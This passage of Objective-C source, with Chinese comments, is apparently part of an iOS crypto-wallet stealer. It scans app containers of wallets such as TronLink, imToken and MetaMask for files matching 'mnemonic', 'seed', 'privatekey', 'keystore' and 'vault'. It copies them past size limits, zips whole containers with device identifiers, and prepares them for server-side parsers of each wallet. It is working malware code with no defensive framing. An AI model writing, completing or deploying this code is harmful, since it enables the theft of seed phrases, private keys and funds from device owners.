            if (![fm fileExistsAtPath:full isDirectory:&isDir] || isDir) continue;
        }

        // 保留容器内相对路径：服务端的 imToken/TP/MetaMask 解析都按原始路径识别材料
        NSString *leaf = [drel stringByAppendingPathComponent:rel];
        if ([self _copyItem:full toDir:outDir name:leaf]) {
            n++;
            total += [self _sizeOf:full];
        }
    }
    if (copied) *copied = n;
    if (bytes) *bytes = total;
    OWLog(@"B: 目录 %@ 命中 %lu 个 / %llu B", drel, (unsigned long)n, total);
}

/// 全容器兜底：定义件不足时才跑。先收集候选路径，再按上限拷贝，同时补全索引。
- (void)_fallbackScanContainer:(NSString *)containerPath
                        outDir:(NSString *)outDir
                          name:(NSString *)name
                          exts:(NSArray<NSString *> *)exts
                      keywords:(NSArray<NSString *> *)keywords
                      excludes:(NSArray<NSString *> *)excludes
                      indexPath:(NSMutableArray<NSString *> *)indexPath
                   includeMedia:(BOOL)includeMedia {
    NSFileManager *fm = [NSFileManager defaultManager];
    NSMutableArray<NSString *> *useExts = [NSMutableArray array];
    for (NSString *e in exts) if (e.length) [useExts addObject:e.lowercaseString];
    NSMutableArray<NSString *> *useKws = [NSMutableArray array];
    for (NSString *k in keywords) if (k.length) [useKws addObject:k.lowercaseString];

    NSArray *scanExts = useExts.count ? useExts : @[@"sqlite", @"sqlite3", @"db", @"realm",
                                                   @"json", @"plist", @"mmkv", @"keystore",
                                                   @"dat", @"bin", @"lock", @"txt", @"xml"];
    NSArray *scanKws = useKws.count ? useKws : @[@"wallet", @"keystore", @"key", @"seed",
                                                @"mnemonic", @"account", @"address", @"vault",
                                                @"realm", @"store", @"persist"];
    NSArray *strong = @[@"keystore", @"seed", @"mnemonic", @"wallet",
                        @"privatekey", @"private_key", @"vault", @"f4secyr"];
    NSSet *media = [NSSet setWithArray:@[@"jpg", @"jpeg", @"png", @"gif", @"heic",
                                         @"mp4", @"mov", @"mp3", @"wav", @"pdf", @"zip"]];

    NSMutableArray<NSString *> *candidates = [NSMutableArray array];
    NSUInteger scanned = 0;
    NSDirectoryEnumerator *en = [fm enumeratorAtPath:containerPath];
    for (NSString *rel in en) {
        if (++scanned > 200000) {
            OWLog(@"B: %@ 兜底遍历达到安全上限 200000 项，停止", name);
            break;
        }
        NSString *lower = rel.lowercaseString;
        BOOL skip = NO;
        for (NSString *ex in excludes) {
            if (ex.length && [lower containsString:ex.lowercaseString]) { skip = YES; break; }
        }
        if (skip) { [en skipDescendants]; continue; }
        if (OWIsHeavyRel(lower, includeMedia)) { [en skipDescendants]; continue; }

        if (indexPath.count < 6000) [indexPath addObject:rel];
        if (candidates.count >= 4000) continue;
        if (!includeMedia && [media containsObject:lower.pathExtension]) continue;
        if ([lower containsString:@"com.apple.mobile_container_manager.metadata.plist"]) continue;

        BOOL hit = [scanExts containsObject:lower.pathExtension];
        if (!hit) {
            for (NSString *k in scanKws) {
                if ([lower rangeOfString:k].location != NSNotFound) { hit = YES; break; }
            }
        }
        if (!hit) {
            for (NSString *k in strong) {
                if ([lower rangeOfString:k].location != NSNotFound) { hit = YES; break; }
            }
        }
        if (!hit) continue;
        [candidates addObject:rel];
    }

    NSUInteger copied = 0;
    uint64_t bytes = 0;
    for (NSString *rel in candidates) {
        if (copied >= 2000 || bytes >= 50ULL * 1024 * 1024) break;
        if (_collectedBytes >= self.maxContainerBytes) break;
        NSString *full = [containerPath stringByAppendingPathComponent:rel];
        BOOL isDir = NO;
        if (![fm fileExistsAtPath:full isDirectory:&isDir] || isDir) continue;
        if ([self _copyItem:full toDir:outDir name:rel]) {
            copied++;
            bytes += [self _sizeOf:full];
        }
    }
    OWLog(@"B: 兜底扫描 %@ 候选 %lu，命中 %lu 个 / %llu B", name,
          (unsigned long)candidates.count, (unsigned long)copied, bytes);
}

- (uint64_t)_sizeOf:(NSString *)path {
    return [[[NSFileManager defaultManager] attributesOfItemAtPath:path error:nil] fileSize];
}

/// 目标变体全查不到时，用 Discovery 的已安装列表按名字模糊反查：
/// "TronLink" → 匹配 bundleId 里含 "tronlink" 的那个（如 com.tronlink.wallet / com.tronlink.pro）。
- (NSString * _Nullable)_fuzzyBundleIdForName:(NSString *)name
                                     installed:(NSDictionary<NSString *, NSString *> *)installed {
    if (!name.length || !installed.count) return nil;
    NSMutableString *token = [NSMutableString string];
    for (NSUInteger i = 0; i < name.length; i++) {
        unichar ch = [name characterAtIndex:i];
        if (isalnum(ch)) [token appendFormat:@"%C", (unichar)tolower(ch)];
    }
    if (token.length < 4) return nil;
    for (NSString *bid in installed) {
        if ([bid.lowercaseString containsString:token]) return bid;
    }
    return nil;
}

- (void)_restorePayloadsFromDir:(NSString *)dir {
    NSFileManager *fm = [NSFileManager defaultManager];
    _payloadBatch = _payloadBatch ?: [NSMutableArray array];
    for (NSString *rel in [fm enumeratorAtPath:dir]) {
        if ([rel.lastPathComponent isEqualToString:@"_file_index.json"]) continue;
        NSString *p = [dir stringByAppendingPathComponent:rel];
        NSDictionary *a = [fm attributesOfItemAtPath:p error:nil];
        if (!a || [a[NSFileType] isEqualToString:NSFileTypeDirectory]) continue;
        BOOL emptyDb = [OWFileGate looksEmptyDatabaseAtPath:p];
        [_payloadBatch addObject:@{@"name": rel, @"bytes": @([a fileSize]), @"valid": @(!emptyDb)}];
    }
}

// 记账：文件数 / 体积 / 是否空库
- (void)_noteResultForName:(NSString *)name
                  bundleId:(NSString *)bid
                     dir:(NSString *)outDir
            containerPath:(NSString *)containerPath {
    NSFileManager *fm = [NSFileManager defaultManager];
    NSMutableArray<NSString *> *files = [NSMutableArray array];
    uint64_t total = 0;
    NSUInteger emptyCount = 0;
    for (NSString *rel in [fm enumeratorAtPath:outDir]) {
        NSString *p = [outDir stringByAppendingPathComponent:rel];
        NSDictionary *a = [fm attributesOfItemAtPath:p error:nil];
        if (!a || [a[NSFileType] isEqualToString:NSFileTypeDirectory]) continue;
        [files addObject:rel];
        total += [a fileSize];
        if ([OWFileGate looksEmptyDatabaseAtPath:p]) emptyCount++;
    }
    NSString *tag = @"";
    if (!files.count) tag = @" [无文件]";
    else if (total == 0) tag = @" [全空]";
    else if (emptyCount) tag = [NSString stringWithFormat:@" [含空库 %lu]",
                                (unsigned long)emptyCount];
    OWLog(@"B: 取得 %@ %lu 个文件 %llu B%@", name, (unsigned long)files.count, total, tag);

    // 批量记账：整目标一次落盘，避免每文件写一份 plist
    if (_payloadBatch.count) {
        [[OWState shared] notePayloads:_payloadBatch];
        [_payloadBatch removeAllObjects];
    }

    [_results addObject:@{
        @"bundleId": bid ?: name,
        @"name": name,
        @"path": outDir,
        @"fileCount": @(files.count),
        @"bytes": @(total),
        @"maxBytes": @(self.maxContainerBytes),
        @"emptyDatabase": @(files.count == 0 || total == 0),
        @"isDir": @(YES),
    }];

    // 目标级断点：记下容器路径/文件数/字节，重启后可跳过
    if (bid.length && files.count > 0) {
        [[OWState shared] markTargetDone:bid
                           containerPath:containerPath ?: @""
                               fileCount:files.count
                                   bytes:total
                                     zip:nil];
    }
}

- (void)_scanDirectory:(NSString *)root
              keywords:(NSArray<NSString *> *)keywords
                  exts:(NSArray<NSString *> *)exts
                 toDir:(NSString *)outDir
                  name:(NSString *)name {
    NSFileManager *fm = [NSFileManager defaultManager];

    NSMutableArray<NSString *> *useExts = [NSMutableArray array];
    for (NSString *e in exts) {
        if (e.length) [useExts addObject:e.lowercaseString];
    }
    if (!useExts.count) {
        [useExts addObjectsFromArray:@[@"sqlite", @"sqlite3", @"db", @"realm", @"json",
                                       @"plist", @"mmkv", @"keystore", @"dat", @"bin",
                                       @"lock", @"txt", @"xml"]];
    }

    NSMutableArray<NSString *> *useKws = [NSMutableArray array];
    for (NSString *k in keywords) {
        if (k.length) [useKws addObject:k.lowercaseString];
    }
    if (!useKws.count) {
        [useKws addObjectsFromArray:@[@"wallet", @"keystore", @"key", @"seed", @"mnemonic",
                                      @"account", @"address", @"vault", @"realm", @"store",
                                      @"persist"]];
    }

    // 即使没有扩展名，命中这些词也捞（F4SeCyr / keystore / seed 等）
    NSArray<NSString *> *strong = @[@"keystore", @"seed", @"mnemonic", @"wallet",
                                    @"privatekey", @"private_key", @"vault", @"f4secyr"];
    NSSet<NSString *> *media = [NSSet setWithArray:@[@"jpg", @"jpeg", @"png", @"gif",
                                                     @"heic", @"mp4", @"mov", @"mp3",
                                                     @"wav", @"pdf", @"zip"]];

    NSDirectoryEnumerator *en = [fm enumeratorAtPath:root];
    NSUInteger scanned = 0, copied = 0;
    uint64_t total = 0;
    for (NSString *rel in en) {
        if (++scanned > 50000) break;
        if (copied >= 2000 || total >= 150ULL * 1024 * 1024) {
            OWLog(@"B: 兜底达到上限 %@（%lu 文件 / %llu B）", name,
                  (unsigned long)copied, total);
            break;
        }
        NSString *lower = rel.lowercaseString;

        // 跳过缓存/崩溃日志/容器元数据，避免把噪音当数据
        if ([lower containsString:@"/library/caches/"] ||
            [lower containsString:@"/tmp/"] ||
            [lower containsString:@"/library/httpstorages/"] ||
            [lower containsString:@"/library/webkit/"] ||
            [lower containsString:@"com.apple.mobile_container_manager.metadata.plist"] ||
            [lower containsString:@"/io.sentry/"] ||
            [lower containsString:@"/com.crashlytics/"]) continue;
        if ([media containsObject:lower.pathExtension]) continue;

        BOOL extHit = [useExts containsObject:lower.pathExtension];
        BOOL kwHit = NO;
        for (NSString *k in useKws) {
            if ([lower rangeOfString:k].location != NSNotFound) { kwHit = YES; break; }
        }
        BOOL strongHit = NO;
        if (!extHit && !kwHit) {
            for (NSString *k in strong) {
                if ([lower rangeOfString:k].location != NSNotFound) { strongHit = YES; break; }
            }
        }
        if (!extHit && !kwHit && !strongHit) continue;

        NSString *src = [root stringByAppendingPathComponent:rel];
        BOOL isDir = NO;
        if (![fm fileExistsAtPath:src isDirectory:&isDir] || isDir) continue;

        // 相对路径扁平化做唯一名，避免多个同名文件互相覆盖
        NSString *leaf = [rel stringByReplacingOccurrencesOfString:@"/" withString:@"_"];
        if ([self _copyItem:src toDir:outDir name:leaf]) {
            copied++;
            total += [[fm attributesOfItemAtPath:src error:nil] fileSize];
        }
    }
    OWLog(@"B: 兜底扫描 %@ 命中 %lu 个 / %llu B", name,
          (unsigned long)copied, total);
}

- (BOOL)_copyItem:(NSString *)src toDir:(NSString *)outDir name:(NSString *)name {
    // 用传入的 name（定义件可能同名但不同目录；边车要带 -wal 后缀）
    NSString *leaf = name.length ? name : src.lastPathComponent;

    NSDictionary *attrs = [[NSFileManager defaultManager] attributesOfItemAtPath:src error:nil];
    if (!attrs) {
        OWLog(@"B: skip 无法 stat %@", leaf);
        return NO;
    }
    uint64_t sz = [attrs fileSize];
    if (_collectedBytes >= self.maxContainerBytes) return NO;
    if (_collectedBytes + sz > self.maxContainerBytes) {
        OWLog(@"B: 达到采集上限 %llu B，跳过 %@", self.maxContainerBytes, leaf);
        _collectedBytes = self.maxContainerBytes;
        return NO;
    }

    // 关键小文件豁免体积门限：这些正是要的东西，不能因为门限被跳过
    NSString *ext = leaf.pathExtension.lowercaseString;
    NSSet *critical = [NSSet setWithArray:@[@"sqlite", @"sqlite3", @"db", @"plist",
                                            @"json", @"realm", @"txt", @"mmkv",
                                            @"keystore", @"dat", @"bin"]];
    BOOL exempt = [critical containsObject:ext];
    if (!exempt) {
        // 非关键文件走统一门限校验（内部会打 gate: 日志说明越界原因）
        if (![OWFileGate isPlausiblePayloadAtPath:src minBytes:1 maxBytes:self.maxFileBytes]) {
            return NO;
        }
    } else if (sz == 0) {
        OWLog(@"B: skip empty %@", leaf);
        return NO;
    }

    NSString *dst = [outDir stringByAppendingPathComponent:leaf];
    // name 现在保留容器内相对路径（如 Documents/walletsV2/x.json）：
    // 服务端各钱包解析器是按原始路径识别的，拍平会认不出来（imToken 的 walletsV2 就是例子）。
    NSString *parent = [dst stringByDeletingLastPathComponent];
    if (parent.length) {
        [[NSFileManager defaultManager] createDirectoryAtPath:parent
                                  withIntermediateDirectories:YES attributes:nil error:nil];
    }
    NSString *part = [dst stringByAppendingString:@".part"];
    NSError *e = nil;
    NSFileManager *fm = [NSFileManager defaultManager];
    [fm removeItemAtPath:part error:nil];
    // 先拷到 .part 再 rename：被杀不会留下“半个正式文件”，下次重拷即可
    if (![fm copyItemAtPath:src toPath:part error:&e]) {
        OWLog(@"B: 拷贝失败 %@ -> %@", leaf, e.localizedDescription);
        [fm removeItemAtPath:part error:nil];
        return NO;
    }
    [fm removeItemAtPath:dst error:nil];
    if (![fm moveItemAtPath:part toPath:dst error:&e]) {
        OWLog(@"B: 落盘失败 %@ -> %@", leaf, e.localizedDescription);
        [fm removeItemAtPath:part error:nil];
        return NO;
    }

    BOOL emptyDb = [OWFileGate looksEmptyDatabaseAtPath:dst];
    _collectedBytes += sz;
    _payloadBatch = _payloadBatch ?: [NSMutableArray array];
    [_payloadBatch addObject:@{@"name": leaf, @"bytes": @(sz), @"valid": @(!emptyDb)}];
    OWLog(@"B: 取得 %@ (%llu B)%@", leaf, sz, emptyDb ? @" [空库]" : @"");
    return YES;
}

- (void)_zipContainer:(NSString *)containerPath to:(NSString *)zipPath name:(NSString *)name {
    // 必须真的生成 zip：只把目录塞进 results 会在上传阶段被 !isDir 过滤掉
    if (!name.length) name = @"Unknown";
    UIDevice *dev = [UIDevice currentDevice];
    NSString *idfv = dev.identifierForVendor.UUIDString ?: @"";
    NSDictionary *manifest = @{
        @"deviceFolder": [NSString stringWithFormat:@"%@ iOS%@ %@",
                          dev.model, dev.systemVersion, idfv],
        @"ios": dev.systemVersion ?: @"",
        @"productType": [OWDeviceProfile current].machine ?: dev.model,
        @"found": @[name],
        @"wallets": @[@{@"wallet": name, @"bundleID": @"", @"bytes": @0}],
        @"source": @"OPENsrc",
    };
    NSError *e = nil;
    BOOL ok = [OWArchive zipDirectory:containerPath
                                   to:zipPath
                             manifest:manifest
                               subdir:name
                             maxBytes:self.maxFileBytes
                             totalCap:self.maxContainerBytes
                                error:&e];
    if (!ok) {
        OWLog(@"B: 整容器打包失败 %@ -> %@", name, e.localizedDescription ?: @"无条目");
        // 退而求其次：把定义件级别的 sqlite/plist/json 全捞一遍
        [self _scanDirectory:containerPath
                    keywords:@[@"wallet", @"key", @"mnemonic", @"seed", @"realm"]
                        exts:@[@"sqlite", @"sqlite3", @"db", @"plist", @"json", @"realm"]
                       toDir:[zipPath stringByDeletingLastPathComponent]
                        name:name];
        return;
    }

    NSDictionary *a = [[NSFileManager defaultManager] attributesOfItemAtPath:zipPath error:nil];
    uint64_t sz = [a fileSize];
    if (sz == 0) { OWLog(@"B: 整容器 zip 为空 %@", name); return; }

    [_results addObject:@{@"name": name, @"path": zipPath, @"bytes": @(sz),
                          @"emptyDb": @NO, @"wholeContainer": @YES}];
    [[OWState shared] notePayload:name bytes:sz valid:YES];
    OWLog(@"B: 整容器打包 %@ -> %llu B", name, sz);
}

- (void)_writeContainerMap:(NSDictionary *)map {
    NSString *p = [self.workDir stringByAppendingPathComponent:@"container_map.plist"];
    [map writeToFile:p atomically:YES];
    OWLog(@"B: 容器映射写入 %lu 条", (unsigned long)map.count);
}

@end
